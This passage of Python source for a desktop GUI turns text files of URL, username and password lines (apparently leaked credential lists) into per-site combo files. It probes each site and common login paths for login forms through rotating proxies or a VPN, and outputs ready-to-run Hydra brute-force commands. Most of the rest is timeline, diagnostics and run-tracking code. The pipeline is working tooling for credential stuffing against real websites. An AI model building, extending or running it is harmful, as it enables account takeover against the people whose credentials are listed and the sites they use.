        field = key_map.get(sort_col, "ts")
        if field == "ts":
            events.sort(key=lambda e: parse_ts(e.get("ts")) or datetime.min, reverse=reverse)
        else:
            events.sort(key=lambda e: str(e.get(field) or "").lower(), reverse=reverse)

        self.timeline_tree.delete(*self.timeline_tree.get_children())
        self.timeline_row_ids = {}
        for event in events:
            iid = event.get("event_id")
            self.timeline_row_ids[iid] = iid
            self.timeline_tree.insert("", "end", iid=iid, values=(event.get("ts", ""), event.get("level", ""), event.get("category", ""), event.get("action", ""), event.get("message", "")))
        self.draw_timeline_canvas(events)

    def sort_timeline_by(self, col):
        reverse = self.timeline_sort_state.get("column") == col and not self.timeline_sort_state.get("reverse", False)
        self.timeline_sort_state = {"column": col, "reverse": reverse}
        self.refresh_timeline_view()

    def draw_timeline_canvas(self, events):
        if not hasattr(self, "timeline_canvas"):
            return
        canvas = self.timeline_canvas
        canvas.delete("all")
        width = max(canvas.winfo_width(), 200)
        height = max(canvas.winfo_height(), 70)
        if not events:
            canvas.create_text(8, height // 2, anchor="w", text="No timeline events")
            return
        times = [parse_ts(e.get("ts")) for e in events]
        times = [t for t in times if t]
        if not times:
            return
        start, end = min(times), max(times)
        span = max((end - start).total_seconds(), 1)
        canvas.create_line(20, height // 2, width - 20, height // 2)
        for i in range(6):
            x = 20 + (width - 40) * (i / 5)
            canvas.create_line(x, (height // 2) - 6, x, (height // 2) + 6)
        for event in events:
            ts = parse_ts(event.get("ts"))
            if not ts:
                continue
            x = 20 + ((ts - start).total_seconds() / span) * (width - 40)
            marker = canvas.create_oval(x - 4, (height // 2) - 4, x + 4, (height // 2) + 4, fill="black")
            canvas.tag_bind(marker, "<Button-1>", lambda _e, eid=event.get("event_id"): self.select_timeline_event(eid))

    def select_timeline_event(self, event_id):
        if event_id in self.timeline_row_ids:
            self.timeline_tree.selection_set(event_id)
            self.timeline_tree.see(event_id)

    def on_timeline_row_selected(self):
        pass

    def export_timeline_csv(self):
        fp = filedialog.asksaveasfilename(defaultextension=".csv", filetypes=[("CSV", "*.csv")])
        if not fp:
            return
        export_timeline_csv(fp, self._filtered_timeline_events())
        self.record_event("INFO", "export", "export", "Timeline CSV exported", {"event_count": len(self._filtered_timeline_events())})
        self.status_text.set(f"Exported timeline CSV: {Path(fp).name}")

    def on_exit(self):
        # FIX: Prevent recursive close handling when WM_DELETE_WINDOW fires repeatedly.
        if getattr(self, "_exit_requested", False):
            return
        self._exit_requested = True
        self._cleanup_log_emitted = False
        self.request_autosave()
        self.autosave_worker.stop()
        self.terminate_all_running_processes("application exit")
        if get_vpn_control(config) == "nordvpn":
            cli_path = self._resolve_nordvpn_cli()
            if cli_path:
                try:
                    subprocess.run([cli_path, "disconnect"], capture_output=True, timeout=10)
                except Exception:
                    pass
        self.root.destroy()

    def build_troubleshooting_tab(self, tab):
        tab.columnconfigure(0, weight=1)
        tab.rowconfigure(1, weight=1)
        controls = ttk.Frame(tab, padding=12)
        controls.grid(row=0, column=0, sticky="ew")
        ttk.Button(controls, text="Refresh", command=self.refresh_troubleshooting_panel).pack(side="left", padx=4)
        ttk.Button(controls, text="Resume Failed", command=self.resume_failed).pack(side="left", padx=4)
        ttk.Button(controls, text="Export Diagnostics CSV", command=self.export_diagnostics_csv).pack(side="left", padx=4)

        summary_frame = ttk.Frame(tab)
        summary_frame.grid(row=1, column=0, sticky="nsew", padx=12, pady=8)
        summary_frame.columnconfigure(0, weight=1)
        summary_frame.rowconfigure(0, weight=1)
        self.diag_summary = tk.Text(summary_frame, height=8, wrap="word")
        self.diag_summary.grid(row=0, column=0, sticky="nsew")
        diag_summary_y = ttk.Scrollbar(summary_frame, orient="vertical", command=self.diag_summary.yview)
        diag_summary_y.grid(row=0, column=1, sticky="ns")
        self.diag_summary.configure(yscrollcommand=diag_summary_y.set)
        self._bind_scroll_wheel(self.diag_summary)

        cols = ("Site", "Error", "Hint", "Last Checked")
        diag_tree_frame = ttk.Frame(tab)
        diag_tree_frame.grid(row=2, column=0, sticky="nsew", padx=12, pady=(0, 12))
        diag_tree_frame.columnconfigure(0, weight=1)
        diag_tree_frame.rowconfigure(0, weight=1)
        self.diag_tree = ttk.Treeview(diag_tree_frame, columns=cols, show="headings", height=10)
        for c in cols:
            self.diag_tree.heading(c, text=c)
            self.diag_tree.column(c, width=180, anchor="w")
        self.diag_tree.grid(row=0, column=0, sticky="nsew")
        diag_tree_y = ttk.Scrollbar(diag_tree_frame, orient="vertical", command=self.diag_tree.yview)
        diag_tree_y.grid(row=0, column=1, sticky="ns")
        diag_tree_x = ttk.Scrollbar(diag_tree_frame, orient="horizontal", command=self.diag_tree.xview)
        diag_tree_x.grid(row=1, column=0, sticky="ew")
        self.diag_tree.configure(yscrollcommand=diag_tree_y.set, xscrollcommand=diag_tree_x.set)
        self._bind_scroll_wheel(self.diag_tree)
        tab.rowconfigure(2, weight=2)
        ttk.Button(tab, text="Copy URL", command=self.copy_diag_url).grid(row=3, column=0, sticky="e", padx=12, pady=(0, 12))

    def refresh_troubleshooting_panel(self):
        if not hasattr(self, "diag_summary"):
            return
        summary = diagnostics_summary(self.sites_db)
        action_text = {
            "DNS failures": "check hostname and DNS/VPN settings",
            "Proxy failures": "verify proxy port is reachable or disable proxy mode",
            "TLS failures": "try without proxy; check HTTPS inspection; ignore_https_errors only for debugging",
            "Connection closed": "service may not be a web endpoint or closed unexpectedly",
            "Other fetch failures": "review logs for stack/error detail",
        }
        lines = []
        self.diag_tree.delete(*self.diag_tree.get_children())
        for category, entries in summary.items():
            lines.append(f"{category}: {len(entries)}")
            tops = ", ".join([f"{d} ({n})" for d, n in top_failing_domains(entries)])
            if tops:
                lines.append(f"  Top domains: {tops}")
            lines.append(f"  Recommendation: {action_text.get(category, 'review diagnostics')}")
            for site, entry in entries:
                self.diag_tree.insert("", "end", iid=site, values=(site, entry.get("last_error_code", ""), entry.get("last_error_hint", ""), entry.get("last_checked_ts", "")))
        self.diag_summary.delete("1.0", tk.END)
        self.diag_summary.insert(tk.END, "\n".join(lines) if lines else "No failures recorded.")

    def copy_diag_url(self):
        sel = self.diag_tree.selection()
        if not sel:
            return
        site = sel[0]
        self.root.clipboard_clear()
        self.root.clipboard_append(site)

    def export_diagnostics_csv(self):
        fp = filedialog.asksaveasfilename(defaultextension=".csv", filetypes=[("CSV", "*.csv")])
        if not fp:
            return
        rows = []
        for item in self.diag_tree.get_children():
            vals = self.diag_tree.item(item, "values")
            rows.append({"site_url": vals[0], "error_code": vals[1], "error_hint": vals[2], "last_checked_ts": vals[3], "status": "fetch_failed", "confidence": "", "action_url": "", "method": "", "user_field": "", "pass_field": "", "submit_mode": "unknown"})
        export_rows_csv(fp, rows)
        self.status_text.set(f"Exported diagnostics CSV: {Path(fp).name}")

    def _start_run_context(self, mode, notes=""):
        started_ts = utc_now_iso()
        self.active_run_context = {
            "run_id": str(uuid.uuid4()),
            "started_ts": started_ts,
            "mode": mode,
            "notes": notes,
            "sites_total_seen": 0,
            "sites_skipped_cached": 0,
            "processed_sites": [],
            "fetch_ms_values": [],
            "extract_ms_values": [],
        }
        self.record_event("INFO", "run", "run_start", "Run started", {"run_id": self.active_run_context["run_id"], "mode": mode})

    def start_pipeline(self):
        if self.processing_thread and self.processing_thread.is_alive():
            messagebox.showinfo("Busy", "Pipeline is already running.")
            return

        self.pipeline_running = True
        self.pipeline_paused = False
        self.pipeline_cancelled = False
        self.cancel_event.clear()
        self.pause_event.clear()

        self.start_button.config(state="disabled")
        self.pause_button.config(text="Pause", state="normal")
        self.cancel_button.config(state="normal")
        self.retry_button.config(state="disabled")
        self.status_text.set("Running...")
        self.state_text.set("Running")
        session_ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.extract_log_file = LOGS_DIR / f"extract_{session_ts}.log"
        self.runner_log_file = LOGS_DIR / f"runner_{session_ts}.log"
        self._start_run_context("extraction")

        self.processing_thread = threading.Thread(target=self.process_pipeline, daemon=True, args=(False,))
        self.processing_thread.start()

    def resume_failed(self):
        if self.processing_thread and self.processing_thread.is_alive():
            messagebox.showinfo("Busy", "Pipeline is already running.")
            return

        self.pipeline_running = True
        self.pipeline_paused = False
        self.pipeline_cancelled = False
        self.cancel_event.clear()
        self.pause_event.clear()

        self.start_button.config(state="disabled")
        self.pause_button.config(text="Pause", state="normal")
        self.cancel_button.config(state="normal")
        self.retry_button.config(state="disabled")
        self.status_text.set("Resuming failed sites...")
        self.state_text.set("Running")
        session_ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.extract_log_file = LOGS_DIR / f"extract_{session_ts}.log"
        self.runner_log_file = LOGS_DIR / f"runner_{session_ts}.log"
        self._start_run_context("extraction", notes="resume_failed_only")

        self.processing_thread = threading.Thread(target=self.process_pipeline, daemon=True, args=(True,))
        self.processing_thread.start()

    def toggle_pause(self):
        if not self.pipeline_running and not self.runner_running:
            return

        is_paused = not self.pause_event.is_set()
        if is_paused:
            self.pause_event.set()
            self.pipeline_paused = True
            self.pause_button.config(text="Resume")
            self.status_text.set("Paused")
            self.state_text.set("Paused")
            self.record_event("INFO", "run", "pause", "Run paused")
            log_once("pipeline-paused", "Pipeline/Runner paused; waiting before launching new work.")
        else:
            self.pause_event.clear()
            self.pipeline_paused = False
            self.pause_button.config(text="Pause")
            self.status_text.set("Running...")
            self.state_text.set("Running")
            self.record_event("INFO", "run", "resume", "Run resumed")

    def cancel_pipeline(self):
        if not self.pipeline_running and not self.runner_running:
            return

        self.pipeline_cancelled = True
        self.pipeline_paused = False
        self.pause_event.clear()
        self.cancel_event.set()
        self.status_text.set("Cancelling...")
        self.state_text.set("Canceled")
        self.record_event("WARN", "run", "cancel", "Run cancellation requested")
        self.cancel_button.config(state="disabled")
        log_once("cancel-requested", "Cancellation requested; stopping outstanding work.")
        self.terminate_all_running_processes("pipeline cancel")

        if self.pipeline_running:
            self.root.after(200, self.check_thread_done)

    def check_thread_done(self):
        if self.processing_thread and self.processing_thread.is_alive():
            self.root.after(500, self.check_thread_done)
        else:
            self.cleanup_after_pipeline("Cancelled by user")

    def cleanup_after_pipeline(self, final_msg):
        if threading.current_thread() is not self._main_thread:
            self.ui_queue.put(("pipeline_done", final_msg))
            return

        self.pipeline_running = False
        self.pipeline_paused = False
        self.pipeline_cancelled = False
        self.cancel_event.clear()
        self.pause_event.clear()

        ctx = self.active_run_context or {}
        summary = ctx.get("summary")
        if summary:
            self.run_summaries.append(summary)
            self.selected_run_id = summary.run_id
            self.refresh_run_history_view()
            top_error = (summary.top_error_codes or [("-", 0)])[0]
            self.record_event(
                "INFO",
                "run",
                "run_end",
                "Run ended",
                {
                    "run_id": summary.run_id,
                    "duration_s": summary.duration_s,
                    "processed": summary.sites_processed_this_run,
                    "fetch_failed": summary.fetch_failed,
                    "top_error": top_error[0],
                },
            )
        self.active_run_context = None

        self.start_button.config(state="normal")
        self.pause_button.config(state="disabled")
        self.cancel_button.config(state="disabled")
        self.retry_button.config(state="normal")
        self.status_text.set(final_msg)
        self.state_text.set("Idle")
        if "cancel" in final_msg.lower():
            self.record_event("WARN", "run", "cancel", final_msg)
        elif "failed" in final_msg.lower():
            self.record_event("ERROR", "run", "complete", final_msg)
        else:
            self.record_event("INFO", "run", "complete", final_msg)
        self.extract_log_file = None
        messagebox.showinfo("Pipeline Status", final_msg)

        self.terminate_all_running_processes("pipeline cleanup")
        if get_vpn_control(config) == "nordvpn":
            cli_path = self._resolve_nordvpn_cli()
            if cli_path and self._windows_nordvpn_supported(cli_path):
                subprocess.run([cli_path, "disconnect"], capture_output=True)
        self.save_processed_data()
        self.refresh_troubleshooting_panel()
        self.request_autosave()

    def wait_if_paused_or_cancelled(self):
        while self.pause_event.is_set() and not self.cancel_event.is_set():
            time.sleep(0.2)
        return self.cancel_event.is_set()

    def _finalize_active_run(self):
        if not self.active_run_context:
            return
        ctx = self.active_run_context
        ended_ts = utc_now_iso()
        env = {
            "proxy_enabled": bool(get_effective_proxy(config, None)),
            "ignore_https_errors": bool(config.get("ignore_https_errors", False)),
            "allow_nonstandard_ports": bool(config.get("allow_nonstandard_ports", False)),
            "app_version": str(config.get("app_version", "unknown")),
        }
        summary = compute_run_summary(
            run_id=ctx.get("run_id"),
            started_ts=ctx.get("started_ts") or ended_ts,
            ended_ts=ended_ts,
            mode=ctx.get("mode", "extraction"),
            notes=ctx.get("notes", ""),
            processed_sites=ctx.get("processed_sites") or [],
            sites_total_seen=ctx.get("sites_total_seen") or 0,
            sites_skipped_cached=ctx.get("sites_skipped_cached") or 0,
            sites_db=self.processed_data,
            fetch_ms_values=ctx.get("fetch_ms_values") or [],
            extract_ms_values=ctx.get("extract_ms_values") or [],
            environment_snapshot=env,
        )
        self.active_run_context["summary"] = summary

    def process_pipeline(self, retry_failed_only=False):
        try:
            input_str = self.input_path.get().strip()
            out_csv = self.output_path.get().strip()
            forms_csv = self.forms_output_path.get().strip()

            if not input_str or not out_csv:
                self.root.after(0, lambda: messagebox.showerror("Error", "Input and main output required."))
                self._finalize_active_run()
                self.cleanup_after_pipeline("Failed - Missing input/output")
                return

            if self.extract_forms.get() and not forms_csv:
                self.root.after(0, lambda: messagebox.showerror("Error", "Forms output required."))
                self._finalize_active_run()
                self.cleanup_after_pipeline("Failed - Missing forms output")
                return

            in_path = Path(input_str)
            out_path = Path(out_csv)
            forms_path = Path(forms_csv) if self.extract_forms.get() else None

            headers = [self.header1.get().strip(), self.header2.get().strip(), self.header3.get().strip()]
            if any(not h for h in headers):
                self.root.after(0, lambda: messagebox.showerror("Error", "All headers required."))
                self._finalize_active_run()
                self.cleanup_after_pipeline("Failed - Missing headers")
                return

            input_files = [in_path] if in_path.is_file() else list(in_path.glob("*.txt"))
            if not input_files:
                self.root.after(0, lambda: messagebox.showerror("Error", "No .txt files found."))
                self._finalize_active_run()
                self.cleanup_after_pipeline("Failed - No input files")
                return

            rows = []
            skipped = 0
            site_combos = {}
            run_processed_sites = []
            run_fetch_ms_values = []
            run_extract_ms_values = []

            self._write_log_threadsafe("Collecting data...")
            self._update_status_threadsafe("Collecting...")
            self._update_progress_threadsafe(mode="indeterminate")
            self._show_progress_threadsafe(True)

            for file in input_files:
                self._write_log_threadsafe(f"Parsing: {file.name}")
                with file.open("r", encoding="utf-8", errors="replace") as f:
                    for ln, raw in enumerate(f, 1):
                        if self.cancel_event.is_set():
                            self._finalize_active_run()
                            self.cleanup_after_pipeline("Cancelled during data collection")
                            return

                        if self.wait_if_paused_or_cancelled():
                            if self.active_run_context is not None:
                                self.active_run_context["processed_sites"] = run_processed_sites
                                self.active_run_context["fetch_ms_values"] = run_fetch_ms_values
                                self.active_run_context["extract_ms_values"] = run_extract_ms_values
                            self._finalize_active_run()
                            self.cleanup_after_pipeline("Cancelled while paused")
                            return

                        line = raw.strip() if self.trim_whitespace.get() else raw.rstrip("\n\r")
                        if self.skip_blank.get() and not line:
                            continue
                        parts = split_three_fields(line)
                        if not parts:
                            skipped += 1
                            continue

                        rows.append(parts)
                        user, pw = parts[1], parts[2]
                        if user or pw:
                            orig_url = normalize_site(parts[0])
                            if orig_url:
                                base = get_base_url(orig_url)
                                if base:
                                    site_combos.setdefault(base, set()).add(f"{user}:{pw}")

            self._write_log_threadsafe(f"Main CSV: {len(rows)} rows | {skipped} skipped")

            out_path.parent.mkdir(parents=True, exist_ok=True)
            with out_path.open("w", newline="", encoding="utf-8") as f:
                writer = csv.writer(f)
                writer.writerow(headers)
                writer.writerows(rows)
            self._write_log_threadsafe(f"Wrote combined CSV → {out_path}")

            if self.create_combo.get():
                for base, combos_set in site_combos.items():
                    combo_path = DATA_DIR / get_site_filename(base)
                    existing = set()
                    if combo_path.exists():
                        with combo_path.open("r", encoding="utf-8") as f:
                            existing = set(line.strip() for line in f if line.strip())
                    new_unique = combos_set - existing
                    if new_unique:
                        with combo_path.open("a", encoding="utf-8") as f:
                            f.write("\n".join(new_unique) + "\n")
                            f.flush()
                        self._write_log_threadsafe(f"Appended {len(new_unique)} new combos to {combo_path.name}")
                    self.processed_data.setdefault(base, {})["combo_count"] = len(existing) + len(new_unique)
                    self.processed_data[base]["combo_path"] = str(combo_path.resolve())

            self.save_processed_data()
            self.refresh_troubleshooting_panel()
            self.request_autosave()

            proxy_candidate = None
            if get_vpn_control(config) == "nordvpn":
                proxy_candidate = self.setup_nordvpn_proxy()

            if get_vpn_control(config) == "none" and config.get("proxy_url", "").strip():
                self._write_log_threadsafe(f"Using configured proxy_url for extraction: {config.get('proxy_url', '').strip()}")

            proxy = get_intercept_proxy(config, proxy_candidate)
            self.proxy_manager = None
            if bool(config.get("proxy_rotation", False)) and config.get("proxy_list_file", "").strip():
                self.proxy_manager = ProxyManager(config.get("proxy_list_file", "").strip())
                self._write_log_threadsafe(f"Proxy rotation enabled ({self.proxy_manager.size} proxies)")
            if config.get("proxy_url", "").strip() and not proxy:
                self.record_event("WARN", "proxy", "disable", "Proxy disabled due to unreachable", {"proxy_url": config.get("proxy_url", "").strip()})

            if self.extract_forms.get() and site_combos:
                site_list = []
                cache_skipped = 0
                for base in site_combos:
                    skip_reason = self._cache_skip_reason(base, retry_failed_only=retry_failed_only)
                    if skip_reason:
                        if skip_reason == "already cached":
                            self._write_log_threadsafe(f"{base} :: Skipped (already cached)")
                        cache_skipped += 1
                        continue
                    site_list.append(base)
                if cache_skipped:
                    self.record_event("INFO", "cache", "load", "Used cached entries", {"skipped": cache_skipped})
                if self.active_run_context is not None:
                    self.active_run_context["sites_total_seen"] = len(site_combos)
                    self.active_run_context["sites_skipped_cached"] = cache_skipped

                if not site_list:
                    self._write_log_threadsafe("No sites need form extraction.")
                    if self.active_run_context is not None:
                        self.active_run_context["processed_sites"] = []
                        self.active_run_context["fetch_ms_values"] = run_fetch_ms_values
                        self.active_run_context["extract_ms_values"] = run_extract_ms_values
                    self._finalize_active_run()
                    self.cleanup_after_pipeline("Complete - No new forms needed.")
                    return

                self._write_log_threadsafe(f"Extracting forms for {len(site_list)} sites...")
                self._update_status_threadsafe("Extracting forms...")
                self._update_progress_threadsafe(mode="determinate", maximum=len(site_list), value=0)
                self._show_progress_threadsafe(True)

                results = []
                total = len(site_list)
                rotation_counter = 0

                def extract_for_site(base):
                    nonlocal rotation_counter
                    if self.cancel_event.is_set():
                        return None

                    if self.wait_if_paused_or_cancelled():
                        return None

                    normalized, invalid_reason = normalize_and_validate_target(base, allow_nonstandard_ports=bool(config.get("allow_nonstandard_ports", False)))
                    if not normalized:
                        return {"status": "skipped_invalid_target", "reason": invalid_reason}

                    urls_to_try = [normalized]
                    if not self.tld_only.get():
                        clean_base = normalized.rstrip('/')
                        for path in COMMON_LOGIN_PATHS:
                            urls_to_try.append(f"{clean_base}{path}")

                    error_info = {"status": "failed", "error_message": "unknown"}
                    current_proxy = self.proxy_manager.get_proxy() if self.proxy_manager else proxy
                    for url in urls_to_try:
                        if not url:
                            continue
                        start_fetch = time.perf_counter()
                        form_data, error_info = extract_login_form(
                            url,
                            current_proxy,
                            strict_validation=self.strict_validation.get(),
                            mode=str(config.get("analysis_mode", "static") or "static"),
                            observation_options={
                                "enable_dummy_interaction": bool(config.get("observation_enable_dummy_interaction", False)),
                                "allowlisted_domains": config.get("observation_allowlisted_domains", []) or [],
                            },
                        )
                        run_fetch_ms_values.append((time.perf_counter() - start_fetch) * 1000)
                        if form_data:
                            return {"status": form_data.get("status", "success_loginish"), "form": form_data, "used_url": url}

                        if isinstance(error_info, dict) and error_info.get("status") == "skipped_invalid_target":
                            return error_info
                        if isinstance(error_info, dict) and error_info.get("status") in {"fetch_failed", "failed"}:
                            continue
                        if isinstance(error_info, dict) and error_info.get("status") == "no_form":
                            continue

                    rotation_counter += 1
                    return error_info if isinstance(error_info, dict) else {"status": "failed", "error_message": str(error_info or "unknown")}

                timeout_seconds = max(15, int(config.get("extract_site_timeout_seconds", 120) or 120))
                executor = ThreadPoolExecutor(max_workers=self.threads.get())
                try:
                    future_to_base = {executor.submit(extract_for_site, base): base for base in site_list}
                    future_started_at = {future: time.monotonic() for future in future_to_base}
                    pending = set(future_to_base)
                    i = 0
                    while pending:
                        done, pending = wait(pending, timeout=0.5, return_when=FIRST_COMPLETED)
                        now_mono = time.monotonic()
                        timed_out = []
                        for future in list(pending):
                            if now_mono - future_started_at.get(future, now_mono) >= timeout_seconds:
                                timed_out.append(future)
                                pending.discard(future)

                        for future in timed_out:
                            base = future_to_base[future]
                            future.cancel()
                            i += 1
                            entry = self.processed_data.setdefault(base, {})
                            now = datetime.now().isoformat()
                            entry.setdefault("first_seen_ts", now)
                            entry["last_checked_ts"] = now
                            entry.update({
                                "status": "failed",
                                "form_found": False,
                                "last_error_code": "extract_timeout",
                                "last_error_hint": "Extraction timed out",
                                "last_error_detail": f"Site extraction exceeded {timeout_seconds}s and was skipped",
                                "last_error_stacktrace": None,
                            })
                            entry["combo_count"] = self.processed_data.get(base, {}).get('combo_count', 0)
                            run_processed_sites.append(base)
                            run_extract_ms_values.append(timeout_seconds * 1000)
                            self._write_log_threadsafe(f"{base} :: status=failed confidence=0 reason=Extraction timed out after {timeout_seconds}s")
                            self._update_progress_threadsafe(value=i)
                            self._update_status_threadsafe(f"Extracting: {i}/{total}")

                        for future in done:
                            i += 1
                            if self.cancel_event.is_set():
                                if self.active_run_context is not None:
                                    self.active_run_context["processed_sites"] = run_processed_sites
                                    self.active_run_context["fetch_ms_values"] = run_fetch_ms_values
                                    self.active_run_context["extract_ms_values"] = run_extract_ms_values
                                self._finalize_active_run()
                                self.cleanup_after_pipeline("Cancelled during extraction")
                                return

                            if self.wait_if_paused_or_cancelled():
                                if self.active_run_context is not None:
                                    self.active_run_context["processed_sites"] = run_processed_sites
                                    self.active_run_context["fetch_ms_values"] = run_fetch_ms_values
                                    self.active_run_context["extract_ms_values"] = run_extract_ms_values
                                self._finalize_active_run()
                                self.cleanup_after_pipeline("Cancelled while paused")
                                return

                            base = future_to_base[future]
                            entry = self.processed_data.setdefault(base, {})
                            now = datetime.now().isoformat()
                            entry.setdefault("first_seen_ts", now)
                            entry["last_checked_ts"] = now
                            try:
                                process_started = time.perf_counter()
                                outcome = future.result() or {"status": "fetch_failed", "error_message": "unknown"}
                                status = outcome.get("status")
                                run_processed_sites.append(base)
                                run_extract_ms_values.append((time.perf_counter() - process_started) * 1000)
                                if status in {"success_form", "success_loginish"}:
                                    form = outcome["form"]
                                    form['base_url'] = base
                                    form['combo_file'] = get_site_filename(base)
                                    if form.get('hydra_command_template'):
                                        form['full_hydra_command'] = form['hydra_command_template'].replace("{{combo_file}}", get_site_filename(base))
                                        results.append(form)
                                    entry.update({
                                        "status": status,
                                        "form_found": status == "success_form",
                                        "last_error_code": None,
                                        "last_error_hint": None,
                                        "last_error_detail": None,
                                        "last_error_stacktrace": None,
                                        "hydra_command_template": form.get("hydra_command_template", ""),
                                        "extracted": {
                                            "page_url": form.get("original_url"),
                                            "action_url": form.get("action_url") or form.get("action"),
                                            "method": form.get("method", "unknown"),
                                            "user_field": form.get("user_field"),
                                            "pass_field": form.get("pass_field"),
                                            "other_fields": form.get("post_data", ""),
                                            "confidence": form.get("confidence"),
                                            "reasons": form.get("reasons"),
                                            "submit_mode": form.get("submit_mode", "unknown"),
                                            "classification": form.get("classification"),
                                            "login_metadata": form.get("login_metadata", {}),
                                            "observed_login_flow": form.get("observed_login_flow"),
                                        },
                                    })
                                    reason = form.get('validation_reason') or form.get('reasons') or 'ok'
                                    self._write_log_threadsafe(f"{base} :: status={status} confidence={form.get('confidence', 0)} reason={reason}")
                                    if form.get('method') == 'get':
                                        self._write_log_threadsafe(f"{base} :: WARN GET login form detected; hydra tuning may be required")
                                elif status == "skipped_invalid_target":
                                    reason = outcome.get('reason', 'invalid target')
                                    entry.update({"status": "skipped_invalid_target", "form_found": False, "last_error_code": "invalid_target", "last_error_hint": reason, "last_error_detail": reason})
                                    self._write_log_threadsafe(f"{base} :: status=skipped_invalid_target confidence=0 reason={reason}")
                                elif status == "no_form":
                                    reason = outcome.get('reason', 'no matching form')
                                    entry.update({"status": "no_form", "form_found": False, "last_error_code": None, "last_error_hint": None, "last_error_detail": None})
                                    self._write_log_threadsafe(f"{base} :: status=no_form ❌ no login form confidence=0 reason={reason}")
                                else:
                                    code = outcome.get("error_code") or "fetch_failed"
                                    hint = outcome.get("error_hint") or outcome.get("hint") or "Navigation failed"
                                    detail = outcome.get("error_detail") or outcome.get("error_message") or "fetch failed"
                                    stacktrace = outcome.get("error_stacktrace")
                                    entry.update({"status": "failed", "form_found": False, "last_error_code": code, "last_error_hint": hint, "last_error_detail": detail, "last_error_stacktrace": stacktrace})
                                    extra = f" detail={detail}" if self.show_debug_details.get() else ""
                                    if self.show_debug_details.get() and stacktrace:
                                        extra += f" stack={stacktrace.splitlines()[-1]}"
                                    self._write_log_threadsafe(f"{base} :: status=failed confidence=0 reason={hint}{extra}")
                                    if code == "proxy_down":
                                        self.record_event("WARN", "proxy", "disable", "Proxy disabled due to unreachable", {"site": base})
                                    elif code == "dns_failed":
                                        self.record_event("WARN", "dns", "failure", "DNS failure detected", {"site": base})
                                    elif code in {"tls_mismatch", "cert_invalid"}:
                                        self.record_event("WARN", "tls", "failure", "TLS mismatch/certificate invalid", {"site": base, "error_code": code})

                                    now_ts = time.time()
                                    self.timeline_fetch_failures.append(now_ts)
                                    while self.timeline_fetch_failures and now_ts - self.timeline_fetch_failures[0] > 60:
                                        self.timeline_fetch_failures.popleft()
                                    if len(self.timeline_fetch_failures) >= 20 and now_ts - self.timeline_last_fetch_burst_ts > 60:
                                        self.timeline_last_fetch_burst_ts = now_ts
                                        self.record_event("WARN", "network", "burst", "Fetch failure burst detected", {"failures": len(self.timeline_fetch_failures), "window_seconds": 60})

                                entry["combo_count"] = self.processed_data.get(base, {}).get('combo_count', 0)
                            except Exception as e:
                                if bool(config.get("debug_logging", False)):
                                    logger.debug(f"Thread error for {base}: {e}")

                            self._update_progress_threadsafe(value=i)
                            self._update_status_threadsafe(f"Extracting: {i}/{total}")
                            if i % 10 == 0:
                                self.save_processed_data()
                finally:
                    executor.shutdown(wait=False, cancel_futures=True)

                self._show_progress_threadsafe(False)

                if results:
                    keys = ['original_url', 'base_url', 'used_url', 'used_type', 'action', 'post_data',
                            'failure_condition', 'hydra_command_template', 'combo_file', 'full_hydra_command', 'confidence', 'validation_reason', 'method', 'method_warning']
                    with forms_path.open("w", newline="", encoding="utf-8") as f:
                        writer = csv.DictWriter(f, fieldnames=keys)
                        writer.writeheader()
                        writer.writerows(results)
                    self._write_log_threadsafe(f"Found {len(results)} validated forms → {forms_path}")

                self._write_log_threadsafe("Updated processed_sites.json")
                self.save_processed_data()
                self.refresh_troubleshooting_panel()
                self.request_autosave()

            if self.active_run_context is not None:
                self.active_run_context["sites_total_seen"] = self.active_run_context.get("sites_total_seen") or len(site_combos)
                self.active_run_context["processed_sites"] = run_processed_sites
                self.active_run_context["fetch_ms_values"] = run_fetch_ms_values
                self.active_run_context["extract_ms_values"] = run_extract_ms_values
            self._finalize_active_run()
            self.cleanup_after_pipeline("Pipeline complete! Check per-site files and hydra_forms.csv")

        except Exception as e:
            if self.active_run_context is not None:
                self.active_run_context["processed_sites"] = run_processed_sites if "run_processed_sites" in locals() else []
                self.active_run_context["fetch_ms_values"] = run_fetch_ms_values if "run_fetch_ms_values" in locals() else []
                self.active_run_context["extract_ms_values"] = run_extract_ms_values if "run_extract_ms_values" in locals() else []
            self._finalize_active_run()
            self.cleanup_after_pipeline(f"Pipeline failed: {str(e)}")
